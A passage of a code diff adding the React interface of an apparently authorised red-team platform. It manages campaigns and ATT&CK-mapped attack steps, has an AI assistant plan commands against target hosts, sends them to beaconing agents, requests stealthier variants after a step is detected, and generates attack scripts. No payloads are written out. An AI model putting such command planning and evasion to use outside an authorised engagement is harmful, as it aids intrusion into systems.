+                  <td className="px-4 py-3 text-right" style={{whiteSpace:"nowrap"}}>
+                    <button
+                      onClick={e => deleteCampaign(e, c)}
+                      disabled={deleting === c.id || c.status === "active"}
+                      title={c.status === "active" ? "Stop campaign dulu sebelum hapus" : "Hapus campaign"}
+                      className="text-slate-600 hover:text-red-400 transition-colors mr-3 disabled:opacity-30 disabled:cursor-not-allowed"
+                    >
+                      {deleting === c.id ? <i className="fa-solid fa-circle-notch spin text-xs"></i> : <i className="fa-solid fa-trash text-xs"></i>}
+                    </button>
+                    <i className="fa-solid fa-chevron-right text-slate-700 text-xs"></i>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Campaign Detail ──────────────────────────────────────────────────────────
+function CampaignDetail({ id, navigate }) {
+  const [campaign, setCampaign] = useState(null);
+  const [steps, setSteps] = useState([]);
+  const [err, setErr] = useState("");
+  const [success, setSuccess] = useState("");
+  const [busy, setBusy] = useState(false);
+  const [showAddStep, setShowAddStep] = useState(false);
+  const [runTarget, setRunTarget] = useState({});
+  const [runningStep, setRunningStep] = useState(null);
+  const [planningStep, setPlanningStep] = useState(null); // stepId being planned
+  const [runningMsg, setRunningMsg] = useState("");       // status message while running
+  const [stepResults, setStepResults] = useState({});    // stepId → execution result
+  const [expandedStep, setExpandedStep] = useState(null); // stepId with result open
+  const [planData, setPlanData] = useState({});           // stepId → Shannon plan object
+  const [editedCmd, setEditedCmd] = useState({});         // stepId → user-edited command string
+  const [editedType, setEditedType] = useState({});       // stepId → current task_type selection
+  const [stepForm, setStepForm] = useState({ phase:"initial_access", technique_id:"", method:"", notes:"", order_index:1, risk_assessment:"medium" });
+  const [techSearch, setTechSearch] = useState("");           // search query for technique picker
+  const [techSuggestions, setTechSuggestions] = useState([]); // list of matching techniques
+  const [techPickerOpen, setTechPickerOpen] = useState(false);
+  const [techSearchLoading, setTechSearchLoading] = useState(false);
+  const [evadeLoading, setEvadeLoading] = useState({});       // stepId → bool: loading evasion alternatives
+  const [evadeData, setEvadeData] = useState({});             // stepId → Shannon evasion alternatives
+  const [scriptState, setScriptState] = useState({});        // stepId → {loading, scripts:[{url,filename,content,language,ext}]}
+  const [deletingStep, setDeletingStep] = useState(null);     // stepId being deleted
+  const [showConfirm, ConfirmNode] = useConfirm();
+
+  // Detect script file URLs in a command string (.ps1/.py/.sh/.bat/.vbs/.rb/.php)
+  const SCRIPT_EXT_RE = /\.(ps1|py|sh|bat|vbs|rb|php|js)(\?[^\s"']*)?(\s|"|'|\]|$)/i;
+  function detectScriptUrls(command) {
+    if (!command) return [];
+    const matches = [];
+    const re = /https?:\/\/[^\s"'<>\]]+/gi;
+    let m;
+    while ((m = re.exec(command)) !== null) {
+      const url = m[0].replace(/[.,;)]+$/, "");
+      if (SCRIPT_EXT_RE.test(url + " ")) {
+        const filename = url.split("/").pop().split("?")[0];
+        const ext = filename.split(".").pop().toLowerCase();
+        if (!matches.find(x => x.url === url))
+          matches.push({ url, filename, ext });
+      }
+    }
+    return matches;
+  }
+
+  const load = useCallback(() => {
+    apiFetch(`/campaigns/${id}`).then(setCampaign).catch(e => setErr(e.message));
+    apiFetch(`/campaigns/${id}/steps`).then(setSteps).catch(() => {});
+  }, [id]);
+  useEffect(() => {
+    load();
+    // Load past execution results on mount (so results persist across page refresh)
+    apiFetch(`/campaigns/${id}/executions`).then(execs => {
+      const byStep = {};
+      for (const ex of execs) { if (ex.step_id) byStep[ex.step_id] = ex; }
+      setStepResults(byStep);
+    }).catch(() => {});
+  }, [id]);
+
+  // Debounced technique search for the Add Step picker
+  useEffect(() => {
+    if (!techSearch.trim()) { setTechSuggestions([]); return; }
+    const timer = setTimeout(async () => {
+      setTechSearchLoading(true);
+      try {
+        const res = await apiFetch(`/techniques/?search=${encodeURIComponent(techSearch)}&limit=20`);
+        setTechSuggestions(Array.isArray(res) ? res : (res.items || []));
+      } catch { setTechSuggestions([]); }
+      finally { setTechSearchLoading(false); }
+    }, 300);
+    return () => clearTimeout(timer);
+  }, [techSearch]);
+
+  function selectTechnique(tech) {
+    // Map tactic → phase key used in the form
+    const tacticMap = {
+      "initial-access":"initial_access","execution":"execution","persistence":"persistence",
+      "privilege-escalation":"privilege_escalation","defense-evasion":"defense_evasion",
+      "credential-access":"credential_access","discovery":"discovery",
+      "lateral-movement":"lateral_movement","collection":"collection",
+      "exfiltration":"exfiltration","impact":"impact","command-and-control":"command_and_control",
+      "reconnaissance":"initial_access","resource-development":"initial_access",
+    };
+    const tactic = (tech.tactic || "").toLowerCase();
+    const phase = tacticMap[tactic] || tactic.replace(/-/g,"_") || "execution";
+    // Default risk from severity if present, otherwise medium
+    const riskMap = { "critical":"critical","high":"high","medium":"medium","low":"low" };
+    const risk = riskMap[(tech.risk_level||"").toLowerCase()] || "medium";
+    setStepForm(f => ({ ...f, technique_id: tech.id, phase, risk_assessment: risk }));
+    setTechSearch(`${tech.id} — ${tech.name}`);
+    setTechSuggestions([]);
+    setTechPickerOpen(false);
+  }
+
+  async function startCampaign() {
+    setBusy(true); setErr("");
+    try { const r = await apiFetch(`/campaigns/${id}/start`, { method:"POST" }); setSuccess(r?.message || "Campaign started"); load(); }
+    catch(ex) { setErr(ex.message); }
+    finally { setBusy(false); }
+  }
+  async function abortCampaign() {
+    const ok = await showConfirm({
+      title: "Hentikan Campaign",
+      message: "Semua aktivitas campaign akan dihentikan dan statusnya berubah menjadi aborted.",
+      confirmLabel: "Ya, Hentikan",
+      variant: "warning",
+      icon: "fa-stop",
+    });
+    if (!ok) return;
+    setBusy(true); setErr("");
+    try { await apiFetch(`/campaigns/${id}/abort`, { method:"POST" }); setSuccess("Campaign aborted"); load(); }
+    catch(ex) { setErr(ex.message); }
+    finally { setBusy(false); }
+  }
+  async function addStep(e) {
+    e.preventDefault(); setErr("");
+    if (!stepForm.technique_id) { setErr("Pilih teknik terlebih dahulu."); return; }
+    try {
+      await apiFetch(`/campaigns/${id}/steps`, { method:"POST", body:JSON.stringify(stepForm) });
+      setShowAddStep(false);
+      setTechSearch("");
+      setTechSuggestions([]);
+      setStepForm({ phase:"initial_access", technique_id:"", method:"", notes:"", order_index:steps.length + 2, risk_assessment:"medium" });
+      load();
+    } catch(ex) { setErr(ex.message); }
+  }
+  // Step 1: Minta Shannon merencanakan perintah (tidak eksekusi)
+  async function planStep(stepId, evCtx) {
+    const target = runTarget[stepId];
+    if (!target?.trim()) { setErr("Isi target IP/hostname terlebih dahulu."); return; }
+    setPlanningStep(stepId); setErr("");
+    try {
+      let url = `/campaigns/${id}/steps/${stepId}/plan?target=${encodeURIComponent(target)}`;
+      if (evCtx) url += `&evasion_context=${encodeURIComponent(evCtx)}`;
+      const plan = await apiFetch(url);
+      setPlanData(prev => ({ ...prev, [stepId]: plan }));
+      setEditedCmd(prev => ({ ...prev, [stepId]: plan.command }));
+      setEditedType(prev => ({ ...prev, [stepId]: plan.task_type }));
+      // Detect script URLs in the planned command and pre-populate scriptState
+      const allCmds = [plan.command, ...(plan.alternatives||[]).map(a=>a.command)].join("\n");
+      const detected = detectScriptUrls(allCmds);
+      if (detected.length > 0) {
+        setScriptState(prev => ({
+          ...prev,
+          [stepId]: { scripts: detected.map(d => ({ ...d, loading: false, content: null, generated: false })) }
+        }));
+      } else {
+        setScriptState(prev => { const n={...prev}; delete n[stepId]; return n; });
+      }
+    } catch(ex) {
+      const msg = ex.message || "";
+      if (msg.includes("rate-limited") || msg.includes("503") || msg.includes("429")) {
+        setErr("Shannon AI sedang rate-limited — terlalu banyak request dalam waktu singkat. Tunggu ~60 detik lalu coba Re-plan.");
+      } else {
+        setErr(msg);
+      }
+    }
+    finally { setPlanningStep(null); }
+  }
+
+  // Step 2: Eksekusi command yang sudah divalidasi / diedit user
+  async function runStep(stepId) {
+    const target = runTarget[stepId];
+    const plan = planData[stepId];
+    const cmd = editedCmd[stepId];
+    if (!target?.trim()) { setErr("Isi target IP/hostname terlebih dahulu."); return; }
+    setRunningStep(stepId); setErr(""); setRunningMsg("Mengirim perintah ke agent…");
+
+    const msgs = [
+      [3000,  "Command dikirim → menunggu agent beacon…"],
+      [15000, "Agent sedang mengeksekusi perintah…"],
+      [40000, "Menunggu agent melaporkan hasil…"],
+      [80000, "Masih berjalan — beacon interval mungkin panjang…"],
+    ];
+    const timers = msgs.map(([ms, msg]) => setTimeout(() => setRunningMsg(msg), ms));
+
+    try {
+      const currentType = editedType[stepId] || plan?.task_type;
+      const body = {};
+      if (plan && cmd && currentType !== "simulation") {
+        body.override_command = cmd;
+        body.override_task_type = currentType;
+      }
+      const r = await apiFetch(
+        `/campaigns/${id}/steps/${stepId}/run?target=${encodeURIComponent(target)}`,
+        { method:"POST", body: JSON.stringify(body), _timeout: 200000 }
+      );
+      if (r && r.success === false) throw new Error(r.error || "Step execution failed");
+      await reloadExecutions();
+      setExpandedStep(stepId);
+      // Clear plan setelah berhasil dieksekusi
+      setPlanData(prev => { const n={...prev}; delete n[stepId]; return n; });
+      setEditedCmd(prev => { const n={...prev}; delete n[stepId]; return n; });
+      setEditedType(prev => { const n={...prev}; delete n[stepId]; return n; });
+      setScriptState(prev => { const n={...prev}; delete n[stepId]; return n; });
+      load();
+    }
+    catch(ex) { setErr(ex.message); setExpandedStep(null); }
+    finally {
+      timers.forEach(t => clearTimeout(t));
+      setRunningStep(null);
+      setRunningMsg("");
+    }
+  }
+
+  function cancelPlan(stepId) {
+    setPlanData(prev => { const n={...prev}; delete n[stepId]; return n; });
+    setEditedCmd(prev => { const n={...prev}; delete n[stepId]; return n; });
+    setEditedType(prev => { const n={...prev}; delete n[stepId]; return n; });
+    setScriptState(prev => { const n={...prev}; delete n[stepId]; return n; });
+  }
+
+  function applyAlternative(stepId, alt) {
+    setEditedCmd(prev => ({ ...prev, [stepId]: alt.command }));
+    setEditedType(prev => ({ ...prev, [stepId]: alt.task_type }));
+    // Re-detect script URLs in the applied alternative
+    const found = detectScriptUrls(alt.command);
+    setScriptState(prev => {
+      if (found.length === 0) { const n={...prev}; delete n[stepId]; return n; }
+      const cur = prev[stepId] || { scripts: [] };
+      const next = found.map(d => cur.scripts.find(x=>x.url===d.url) || { ...d, loading:false, content:null, generated:false });
+      return { ...prev, [stepId]: { scripts: next } };
+    });
+  }
+
+  async function reloadExecutions() {
+    try {
+      const execs = await apiFetch(`/campaigns/${id}/executions`);
+      const byStep = {};
+      for (const ex of execs) {
+        if (ex.step_id) byStep[ex.step_id] = ex;
+      }
+      setStepResults(byStep);
+    } catch {}
+  }
+
+  // Ask Shannon for evasion / retry alternatives after a failed or detected execution
+  async function askEvadeAlternatives(stepId, res) {
+    // Ensure target is set so planStep can work
+    if (!runTarget[stepId] && res.target) {
+      setRunTarget(prev => ({ ...prev, [stepId]: res.target }));
+    }
+    setEvadeLoading(prev => ({ ...prev, [stepId]: true }));
+    const evCtx = res.status === "failed"
+      ? `Previous attempt FAILED: ${(res.error_message || "unknown error").slice(0, 200)}`
+      : `Previous attempt was DETECTED by security controls. Need a stealthier variant.`;
+    try {
+      await planStep(stepId, evCtx);
+    } catch(ex) { setErr(ex.message); }
+    finally { setEvadeLoading(prev => ({ ...prev, [stepId]: false })); }
+  }
+
+  async function generateScript(stepId, scriptRef, commandContext) {
+    setScriptState(prev => {
+      const cur = prev[stepId] || { scripts: [] };
+      const scripts = cur.scripts.map(s =>
+        s.url === scriptRef.url ? { ...s, loading: true } : s
+      );
+      return { ...prev, [stepId]: { ...cur, scripts } };
+    });
+    try {
+      const result = await apiFetch(
+        `/campaigns/${id}/steps/${stepId}/generate-script` +
+        `?script_url=${encodeURIComponent(scriptRef.url)}` +
+        `&command_context=${encodeURIComponent((commandContext || "").slice(0, 600))}`
+        , { method: "POST" }
+      );
+      setScriptState(prev => {
+        const cur = prev[stepId] || { scripts: [] };
+        const scripts = cur.scripts.map(s =>
+          s.url === scriptRef.url ? { ...s, loading: false, content: result.content,
+            language: result.language, generated: true } : s
+        );
+        return { ...prev, [stepId]: { ...cur, scripts } };
+      });
+    } catch(ex) {
+      setScriptState(prev => {
+        const cur = prev[stepId] || { scripts: [] };
+        const scripts = cur.scripts.map(s =>
+          s.url === scriptRef.url ? { ...s, loading: false, error: ex.message } : s
+        );
+        return { ...prev, [stepId]: { ...cur, scripts } };
+      });
+    }
+  }
+
+  async function deleteStep(stepId) {
+    const ok = await showConfirm({
+      title: "Hapus Attack Step",
+      message: "Step ini dan seluruh riwayat eksekusinya akan dihapus permanen.\nTindakan ini tidak bisa dibatalkan.",
+      confirmLabel: "Ya, Hapus Step",
+      variant: "danger",
+    });
+    if (!ok) return;
+    setDeletingStep(stepId);
+    try {
+      await apiFetch(`/campaigns/${id}/steps/${stepId}`, { method:"DELETE" });
+      cancelPlan(stepId);
+      load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setDeletingStep(null); }
+  }
+
+  function downloadScript(filename, content) {
+    const blob = new Blob([content], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = filename;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+
+  if (!campaign) return <Spinner />;
+  const canStart = ["draft","paused"].includes(campaign.status);
+  const canAbort = campaign.status === "active";
+
+  return (
+    <div className="space-y-5">
+      {ConfirmNode}
+      <div className="flex items-center gap-3">
+        <button onClick={() => navigate("campaigns")} className="btn-ghost"><i className="fa-solid fa-arrow-left mr-1.5"></i>Back</button>
+        <span className="text-slate-400">/</span>
+        <span className="text-slate-900 font-semibold">{campaign.name}</span>
+        <StatusBadge status={campaign.status} />
+      </div>
+      <Alert msg={err} onClose={() => setErr("")} />
+      <Alert type="success" msg={success} onClose={() => setSuccess("")} />
+
+      <div className="grid grid-cols-3 gap-4">
+        <div className="col-span-2 card p-5 space-y-4">
+          <div className="flex items-start justify-between gap-3">
+            <div>
+              <h2 className="text-lg font-bold text-slate-900">{campaign.name}</h2>
+              <p className="text-sm text-slate-500">{campaign.description || "—"}</p>
+            </div>
+            <div className="flex gap-2 shrink-0">
+              {canStart && <button className="btn-sm btn-emerald" onClick={startCampaign} disabled={busy}><i className="fa-solid fa-play"></i>{busy?"Starting…":"Start"}</button>}
+              {canAbort && <button className="btn-sm btn-red" onClick={abortCampaign} disabled={busy}><i className="fa-solid fa-stop"></i>Abort</button>}
+            </div>
+          </div>
+          <div className="grid grid-cols-3 gap-4 text-sm">
+            {[["Client", campaign.client_name],["Type", campaign.engagement_type],["Environment", campaign.environment_type?.toUpperCase()],
+              ["Safe Mode", campaign.production_safe_mode?"✓ Enabled":"✗ Disabled"],["Emergency", campaign.emergency_contact||"—"],["Steps", steps.length]].map(([l,v])=>(
+              <div key={l}><div className="text-xs text-slate-500 uppercase tracking-wider mb-0.5">{l}</div><div className="text-slate-900 font-medium">{v}</div></div>
+            ))}
+          </div>
+          {campaign.rules_of_engagement && (
+            <div className="p-3 rounded-lg text-sm text-slate-600" style={{background:"#F8FAFC",border:"1px solid #E2E8F0"}}>
+              <div className="text-xs text-slate-500 uppercase tracking-wider mb-1 font-semibold">Rules of Engagement</div>
+              {campaign.rules_of_engagement}
+            </div>
+          )}
+          {campaign.target_ips?.length > 0 && (
+            <div><div className="text-xs text-slate-500 uppercase tracking-wider mb-1.5">Target IPs</div>
+              <div className="flex flex-wrap gap-1.5">{campaign.target_ips.map(ip=><span key={ip} className="tag-chip">{ip}</span>)}</div>
+            </div>
+          )}
+        </div>
+        <div className="card p-5">
+          <p className="text-xs font-semibold text-slate-500 uppercase tracking-wider mb-3">Reports & Export</p>
+          <div className="space-y-1.5">
+            {[["JSON Report","fa-code",`/reports/campaigns/${id}`],["HTML Report","fa-file-code",`/reports/campaigns/${id}/html`],
+              ["PDF Report","fa-file-pdf",`/reports/campaigns/${id}/pdf`],["ATT&CK Navigator","fa-map",`/reports/campaigns/${id}/navigator`],
+              ["STIX Bundle","fa-share-nodes",`/stix/campaigns/${id}`],["STIX Download","fa-download",`/stix/campaigns/${id}/download`]].map(([l,ic,p])=>(
+              <a key={l} href={`${API}${p}`} target="_blank"
+                className="flex items-center gap-3 px-3 py-2 rounded-lg hover:bg-slate-50 text-sm text-slate-600 hover:text-slate-900 transition-all">
+                <i className={`fa-solid ${ic} w-4 text-center text-blue-500 text-xs`}></i>{l}
+              </a>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* Steps */}
+      <div className="card overflow-hidden">
+        <div className="flex items-center justify-between px-5 py-4" style={{borderBottom:"1px solid #E2E8F0"}}>
+          <div><h3 className="font-semibold text-slate-900">Attack Steps</h3><p className="text-xs text-slate-500 mt-0.5">{steps.length} steps</p></div>
+          <button className="btn-sm btn-purple" onClick={() => setShowAddStep(!showAddStep)}><i className="fa-solid fa-plus"></i>Add Step</button>
+        </div>
+
+        {showAddStep && (
+          <div className="p-5" style={{borderBottom:"1px solid #E2E8F0",background:"#F8FAFC"}}>
+            <form onSubmit={addStep} className="space-y-3">
+              {/* Technique search picker */}
+              <FormField label="Technique" required>
+                <div className="relative">
+                  <input
+                    className="input-field w-full"
+                    placeholder="Search by ID or name… e.g. T1059 or 'credential dump'"
+                    value={techSearch}
+                    onFocus={() => { if (techSearch) setTechPickerOpen(true); }}
+                    onChange={e => { setTechSearch(e.target.value); setTechPickerOpen(true);
+                      // If user clears, also clear the technique_id
+                      if (!e.target.value) setStepForm(f=>({...f,technique_id:"",phase:"initial_access",risk_assessment:"medium"}));
+                    }}
+                    autoComplete="off"
+                  />
+                  {techSearchLoading && (
+                    <span className="absolute right-3 top-2.5 text-slate-500 text-xs">searching…</span>
+                  )}
+                  {techPickerOpen && techSuggestions.length > 0 && (
+                    <div className="absolute z-50 w-full mt-1 rounded-lg shadow-xl border overflow-y-auto"
+                         style={{background:"#ffffff",borderColor:"#E2E8F0",maxHeight:"260px"}}>
+                      {techSuggestions.map(t => (
+                        <div key={t.id}
+                          className="px-3 py-2 cursor-pointer hover:bg-slate-50 flex items-start gap-3"
+                          onMouseDown={e => { e.preventDefault(); selectTechnique(t); }}>
+                          <span className="font-mono text-xs text-emerald-600 shrink-0 mt-0.5 w-20">{t.id}</span>
+                          <div className="flex-1 min-w-0">
+                            <div className="text-sm text-slate-900 truncate">{t.name}</div>
+                            <div className="flex items-center gap-1.5 mt-0.5 flex-wrap">
+                              <span className="text-xs text-slate-500">{t.tactic}</span>
+                              {t.risk_level && <span className={`text-xs px-1 rounded badge-${t.risk_level}`}>{t.risk_level}</span>}
+                              {t.environment && (
+                                <span className="text-xs px-1.5 py-0 rounded font-semibold"
+                                  style={{
+                                    background: t.environment==="ot" ? "#FEF3C7" : t.environment==="both" ? "#EDE9FE" : "#F1F5F9",
+                                    color: t.environment==="ot" ? "#b45309" : t.environment==="both" ? "#7C3AED" : "#64748b",
+                                    border: `1px solid ${t.environment==="ot" ? "#FDE68A" : t.environment==="both" ? "#DDD6FE" : "#CBD5E1"}`
+                                  }}>
+                                  {t.environment==="ot" ? "OT/ICS" : t.environment==="both" ? "IT+OT" : "IT"}
+                                </span>
+                              )}
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+                </div>
+                {/* Show auto-filled badge */}
+                {stepForm.technique_id && (
+                  <div className="mt-1 flex gap-2 text-xs">
+                    <span className="px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 font-mono border border-emerald-200">{stepForm.technique_id}</span>
+                    <span className="px-2 py-0.5 rounded bg-slate-100 text-slate-600 border border-slate-200">{stepForm.phase}</span>
+                    <span className={`px-2 py-0.5 rounded badge-${stepForm.risk_assessment}`}>{stepForm.risk_assessment}</span>
+                    <button type="button" className="text-slate-500 hover:text-red-400" onClick={()=>{ setTechSearch(""); setStepForm(f=>({...f,technique_id:"",phase:"initial_access",risk_assessment:"medium"})); }}>✕ clear</button>
+                  </div>
+                )}
+              </FormField>
+
+              <div className="grid grid-cols-3 gap-3">
+                <FormField label="Order #">
+                  <input type="number" min={0} className="input-field" value={stepForm.order_index} onChange={e=>setStepForm(f=>({...f,order_index:parseInt(e.target.value)||0}))} />
+                </FormField>
+                <FormField label="Method"><input className="input-field" value={stepForm.method} onChange={e=>setStepForm(f=>({...f,method:e.target.value}))} placeholder="spearphish, exploit, script…" /></FormField>
+                <FormField label="Notes"><input className="input-field" value={stepForm.notes} onChange={e=>setStepForm(f=>({...f,notes:e.target.value}))} placeholder="Notes…" /></FormField>
+              </div>
+              <div className="flex gap-2">
+                <button type="submit" className="btn-sm btn-emerald">Add Step</button>
+                <button type="button" className="btn-ghost btn-sm" onClick={() => setShowAddStep(false)}>Cancel</button>
+              </div>
+            </form>
+          </div>
+        )}
+
+        {steps.length === 0 ? (
+          <div className="text-center py-12 text-slate-600"><i className="fa-solid fa-list-check text-3xl mb-3 block"></i>No steps yet</div>
+        ) : (
+          <table className="w-full text-sm">
+            <thead><tr style={{background:"#F8FAFC", borderBottom:"1px solid #E2E8F0"}}>
+              {["#","Phase","Technique","Method","Risk","Status","Plan & Run",""].map(h=>(
+                <th key={h} className="text-left px-4 py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">{h}</th>
+              ))}
+            </tr></thead>
+            <tbody className="divide-y" style={{borderColor:"#E2E8F0"}}>
+              {steps.map(s => {
+                const res = stepResults[s.id];
+                const isExpanded = expandedStep === s.id;
+                const hasResult = !!res;
+                const findings = res?.findings || [];
+                const detected = findings.some(f => f.detected);
+                const via = res?.dispatched_via;
+                const plan = planData[s.id];
+                const hasPlan = !!plan;
+                const isPlanning = planningStep === s.id;
+                const isRunning = runningStep === s.id;
+
+                return (
+                  <React.Fragment key={s.id}>
+                    <tr className="table-row">
+                      <td className="px-4 py-3 text-slate-500 font-mono text-xs">{s.order_index}</td>
+                      <td className="px-4 py-3 text-slate-400 text-xs">{s.phase}</td>
+                      <td className="px-4 py-3 font-mono font-semibold" style={{color:"#a78bfa"}}>{s.technique_id}</td>
+                      <td className="px-4 py-3 text-slate-400 text-xs max-w-[140px] truncate">{s.method || "—"}</td>
+                      <td className="px-4 py-3"><span className={`badge badge-${s.risk_assessment}`}>{s.risk_assessment}</span></td>
+                      <td className="px-4 py-3">
+                        <span className={`badge badge-${s.status}`}>{s.status}</span>
+                        {via && <span className="ml-1 text-xs text-slate-600">({via.replace(/_/g," ")})</span>}
+                      </td>
+                      <td className="px-4 py-3">
+                        <div className="flex flex-col gap-1">
+                          <div className="flex items-center gap-2 flex-wrap">
+                            <input className="input-field" style={{width:"110px",padding:"0.25rem 0.5rem"}} placeholder="IP / hostname"
+                              value={runTarget[s.id]||""} onChange={e=>setRunTarget(t=>({...t,[s.id]:e.target.value}))} />
+                            {/* Plan button — visible if no plan yet, or if planning (shows spinner) */}
+                            {(!hasPlan || isPlanning) && !hasPlan && (
+                              <button className="btn-sm btn-blue" disabled={!!runningStep}
+                                onClick={()=>planStep(s.id)}
+                                title="Ask Shannon AI to plan this technique">
+                                {isPlanning
+                                  ? <><i className="fa-solid fa-circle-notch spin mr-1"></i>Planning…</>
+                                  : <><i className="fa-solid fa-wand-magic-sparkles mr-1"></i>Plan</>}
+                              </button>
+                            )}
+                            {/* Execute button — visible after plan is ready */}
+                            {hasPlan && (
+                              <>
+                                <button className="btn-sm btn-emerald" disabled={isRunning || isPlanning}
+                                  onClick={()=>runStep(s.id)}
+                                  title="Execute the command below">
+                                  {isRunning
+                                    ? <><i className="fa-solid fa-circle-notch spin mr-1"></i>Running…</>
+                                    : <><i className="fa-solid fa-play mr-1"></i>Execute</>}
+                                </button>
+                                <button className="btn-sm btn-ghost" disabled={isRunning}
+                                  onClick={()=>cancelPlan(s.id)} title="Dismiss plan">
+                                  <i className="fa-solid fa-xmark"></i>
+                                </button>
+                              </>
+                            )}
+                            {hasResult && (
+                              <button className="btn-sm btn-ghost" onClick={()=>setExpandedStep(isExpanded ? null : s.id)}>
+                                <i className={`fa-solid fa-chevron-${isExpanded?"up":"down"} mr-1`}></i>Result
+                              </button>
+                            )}
+                          </div>
+                          {isRunning && runningMsg && (
+                            <span className="text-xs" style={{color:"#a78bfa"}}>
+                              <i className="fa-solid fa-circle-notch spin mr-1" style={{fontSize:"0.6rem"}}></i>
+                              {runningMsg}
+                            </span>
+                          )}
+                        </div>
+                      </td>
+                      <td className="px-3 py-3">
+                        <button
+                          onClick={() => deleteStep(s.id)}
+                          disabled={deletingStep === s.id || isRunning}
+                          title="Hapus step"
+                          className="text-slate-600 hover:text-red-400 transition-colors disabled:opacity-30 disabled:cursor-not-allowed"
+                        >
+                          {deletingStep === s.id
+                            ? <i className="fa-solid fa-circle-notch spin text-xs"></i>
+                            : <i className="fa-solid fa-trash text-xs"></i>}
+                        </button>
+                      </td>
+                    </tr>
+
+                    {/* ── Plan Review Panel ── */}
+                    {(hasPlan || isPlanning) && (() => {
+                      const panelPlan = plan; // may be null if first-time planning
+                      const cmdVal = editedCmd[s.id] ?? panelPlan?.command ?? "";
+                      const typeVal = editedType[s.id] || panelPlan?.task_type || "shell_command";
+                      return (
+                      <tr><td colSpan={8} className="fade-in" style={{
+                        background:"#EFF6FF",
+                        borderBottom:"1px solid #BFDBFE",
+                        borderTop:"1px solid #BFDBFE",
+                        padding:"1.25rem 1.5rem"
+                      }}>
+                        {isPlanning && !panelPlan ? (
+                          /* Loading skeleton while planning for the first time */
+                          <div className="flex items-center gap-3 text-slate-500 text-sm">
+                            <i className="fa-solid fa-circle-notch spin" style={{color:"#3b82f6"}}></i>
+                            <span>Shannon AI sedang merencanakan…</span>
+                          </div>
+                        ) : panelPlan && (
+                        <div className="space-y-4">
+
+                          {/* ── Header ── */}
+                          <div className="flex items-start justify-between gap-3">
+                            <div className="flex items-center gap-2.5 flex-wrap">
+                              <span className="text-xs font-semibold tracking-wide" style={{color:"#60a5fa"}}>
+                                <i className="fa-solid fa-wand-magic-sparkles mr-1.5" style={{color:"#818cf8"}}></i>
+                                Shannon AI Plan
+                              </span>
+                              <span className="text-xs text-slate-500">
+                                {panelPlan.technique_id}
+                                {panelPlan.technique_name && panelPlan.technique_name !== panelPlan.technique_id
+                                  ? ` · ${panelPlan.technique_name}` : ""}
+                              </span>
+                              {panelPlan.tactic && (
+                                <span className="text-xs px-2 py-0 rounded-full"
+                                  style={{background:"#DBEAFE",color:"#1d4ed8",letterSpacing:"0.03em"}}>
+                                  {panelPlan.tactic}
+                                </span>
+                              )}
+                            </div>
+                            <div className="flex items-center gap-2 shrink-0">
+                              {panelPlan.has_agent
+                                ? <span className="flex items-center gap-1.5 text-xs px-2 py-1 rounded-md"
+                                    style={{background:"#052e16",color:"#4ade80",border:"1px solid #14532d"}}>
+                                    <i className="fa-solid fa-circle text-[6px]" style={{color:"#22c55e"}}></i>
+                                    {panelPlan.agent_hostname}
+                                    <span className="text-slate-500">·</span>
+                                    <span style={{color:"#86efac"}}>{panelPlan.agent_os}</span>
+                                    <span className="text-slate-500">·</span>
+                                    <span style={{color:"#6ee7b7"}}>{panelPlan.agent_privilege}</span>
+                                  </span>
+                                : <span className="flex items-center gap-1.5 text-xs px-2 py-1 rounded-md"
+                                    style={{background:"#1c1107",color:"#f59e0b",border:"1px solid #78350f"}}>
+                                    <i className="fa-solid fa-triangle-exclamation text-[9px]"></i>
+                                    Simulation — no agent
+                                  </span>}
+                            </div>
+                          </div>
+
+                          {/* ── Explanation ── */}
+                          {panelPlan.explanation && (
+                            <p className="text-xs leading-relaxed"
+                              style={{color:"#475569",borderLeft:"2px solid #93C5FD",paddingLeft:"0.75rem",fontStyle:"italic"}}>
+                              {panelPlan.explanation}
+                            </p>
+                          )}
+
+                          {/* ── Command editor ── */}
+                          <div className="rounded-lg overflow-hidden" style={{border:"1px solid #93C5FD"}}>
+                            {/* Toolbar */}
+                            <div className="flex items-center justify-between px-3 py-2"
+                              style={{background:"#DBEAFE",borderBottom:"1px solid #93C5FD"}}>
+                              <div className="flex items-center gap-2">
+                                <span className="text-xs text-slate-600">
+                                  {panelPlan.has_agent ? "Command" : "Payload"}
+                                </span>
+                                <select
+                                  style={{background:"#ffffff",color:"#374151",border:"1px solid #93C5FD",
+                                          padding:"0.1rem 0.4rem",fontSize:"0.7rem",borderRadius:"0.25rem",outline:"none"}}
+                                  value={typeVal}
+                                  onChange={e=>setEditedType(prev=>({...prev,[s.id]:e.target.value}))}>
+                                  {[
+                                    ["shell_command","cmd / shell"],
+                                    ["powershell","powershell"],
+                                    ["python_exec","python -c (auto-wrap)"],
+                                    ["simulation","simulation"],
+                                  ].map(([v,l])=>(
+                                    <option key={v} value={v}>{l}</option>
+                                  ))}
+                                </select>
+                              </div>
+                              <button
+                                className="text-xs text-slate-600 hover:text-slate-400 transition-colors"
+                                type="button"
+                                title="Reset to original"
+                                onClick={()=>{
+                                  const orig = planData[s.id];
+                                  if (orig) {
+                                    setEditedCmd(prev=>({...prev,[s.id]:orig.command}));
+                                    setEditedType(prev=>({...prev,[s.id]:orig.task_type}));
+                                  }
+                                }}>
+                                <i className="fa-solid fa-rotate-left mr-1"></i>Reset
+                              </button>
+                            </div>
+                            {/* Textarea */}
+                            <textarea
+                              style={{
+                                width:"100%", minHeight:"88px", resize:"vertical",
+                                background:"#050d18", color:"#7dd3fc",
+                                border:"none", outline:"none",
+                                padding:"0.75rem 1rem",
+                                fontFamily:"'JetBrains Mono','Fira Code','Courier New',monospace",
+                                fontSize:"0.78rem", lineHeight:"1.65",
+                                boxSizing:"border-box", display:"block"
+                              }}
+                              value={cmdVal}
+                              onChange={e => {
+                                const v = e.target.value;
+                                setEditedCmd(prev => ({...prev, [s.id]: v}));
+                                // Re-detect script URLs as user edits
+                                const found = detectScriptUrls(v);
+                                setScriptState(prev => {
+                                  const cur = prev[s.id] || { scripts: [] };
+                                  // Merge: keep existing generated ones, add new, remove gone
